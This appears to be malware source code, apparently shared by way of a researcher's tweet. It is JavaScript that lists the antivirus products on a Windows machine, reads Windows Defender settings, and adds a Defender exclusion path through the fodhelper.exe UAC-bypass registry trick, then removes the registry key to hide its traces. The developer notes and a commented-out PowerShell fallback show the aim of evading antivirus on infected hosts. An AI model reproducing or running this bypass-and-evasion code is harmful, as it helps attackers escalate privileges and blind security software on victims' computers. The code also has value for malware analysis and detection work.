https://twitter.com/JAMESWT_MHT/status/1168534603554086912


Original Notes:

// ===================================== Add windef exclusion
// Todo:
// if user==system than add exclusion without UAC bypass
// add ms essentials.
// hide cmd windows? hide error windows? mshta vbscript:Execute("MsgBox(""amessage"",64,""atitle"")(window.close)")
// find path to wmic.exe - C:\Windows\System32\wbem\WMIC.exe
// find path to white listed exe?
//
// add check for windef status - WMIC /Namespace:\\root\Microsoft\Windows\Defender Path MSFT_MpComputerStatus Get * /format:list
// if it fail, than windef probably disabled
//
// indexOf() is case sensitive!
// Don't check PUAProtection! error at win8


function getAv(onDone) {
	let strAv = '';

		logIt("GetAV processing...");

		let cmdline = 'WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /format:list';
		execFile(cmd, ['/c', cmdline], {
			timeout : 30000,
			windowsHide  : true,
			windowsVerbatimArguments : true
		},function(err, stdout, stderr){		
		  if (err) {
			logIt('GetAV EXEC_ERROR : ' + err.message);
			return onDone(err, '');
		  }

				if(stdout.indexOf('displayName') !== -1){
					strAv = stdout.split('\n').filter(function(line){
						return (line.length > 2);
					}).map(function(line){
						return line.trim();
					}).join('|');

					logIt('GetAV records: ' + strAv);
					return onDone(null, strAv);
				} else if(stderr.match(/Non vi sono istanze disponibili|No Instance\(s\) Available/)){
					logIt('GetAV records: NOAV');
					return onDone(null, 'NOAV');
				} else {
					logIt('GetAV records: PARSE_ERR: ' + stderr);
					return onDone(null, 'PARSE_ERR');
				}
				


		});

}








function getWinDefPrefs(onDone) {
	let cmdlineGetPrefs = 'WMIC /Node:localhost /Namespace:\\\\root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference Get * /format:list | findstr /i "DisableRealtimeMonitoring ExclusionPath ExclusionProcess MAPSReporting SubmitSamplesConsent"'; // Invisible

	execFile(cmd, ['/c', cmdlineGetPrefs], {
		timeout : 30000,
		windowsHide  : true,
		windowsVerbatimArguments : true
	}, function(err, stdout, stderr){
//		if(err) logIt('ERROR: ' + err.message + ' stderr: ' + stderr);
//		logIt('WinDefPrefs after: ' + stdout);
		onDone(err, stdout, stderr);
	});	
}


function addExclusion(onDone){
	let whiteListExe;
		
	whiteListExe = '%SystemRoot%\\system32\\fodhelper.exe';
	
	let cmdline = 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /v DelegateExecute /d "" /t REG_SZ && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /d "cmd /c start /min WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\"' + excludeDir + '\\"" /t REG_SZ && ' + whiteListExe + ' & ping -n 7 127.0.0.1 > NUL & reg delete HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f';
		
//	logIt(cmdline);

	
	
	execFile(cmd, ['/c', cmdline], {
		timeout : 30000,
		windowsHide : false,
		windowsVerbatimArguments : true
	}, function(err, stdout, stderr){
		if(err) logIt('EXEC_ERROR: ' + err.message + ' stderr: ' + stderr);
		logIt('cmd1 stdout: ' + stdout);
		
			getWinDefPrefs(function(err, stdout, stderr){	
				if(err) logIt('EXEC_ERROR: ' + err.message + ' stderr: ' + stderr);
				logIt('WinDefPrefs after: ' + stdout.trim());	
				
					if(stdout.toLowerCase().indexOf(excludeDir.toLowerCase()) !== -1) {
						logIt('Exclusion succesfuly added:', versionString);
						onDone(0);
					} else {
						//logIt('Exclusion add failed.');
						logIt('Exclusion add completely failed:', versionString, 'wlexe:', whiteListExe); 
						onDone(-1);
						/* // adding exlusion without UAC bypass will always fail.
						
									let cmdline = 'Set-MpPreference -ExclusionPath "' + excludeDir +'"';
	//											let cmdline = '$env:PROCESSOR_ARCHITECTURE | Out-File -filePath C:\\temp\\test';
									
									logIt(cmdline);
									logIt('powershellFile: ' + powershellFile);
									execFile(powershellFile, ['-c', cmdline], {
										timeout : 40000,
										windowsHide  : true,
										windowsVerbatimArguments : true
									}, function(err, stdout, stderr){
										if(err) logIt('EXEC_ERROR: ' + err.message + ' stderr: ' + stderr);
										if(stdout.toLowerCase().indexOf(excludeDir.toLowerCase()) !== -1) {
											logIt('Exclusion succesfuly added without UAC bypass.');
											onDone(0);
										} else {
											logIt('Exclusion add completely failed at OS: ' + versionString + ' bot.os: ' + process.bot.os); 
											onDone(-1);
										}
					
									});
						*/
					}
			});
			
			

	});
}
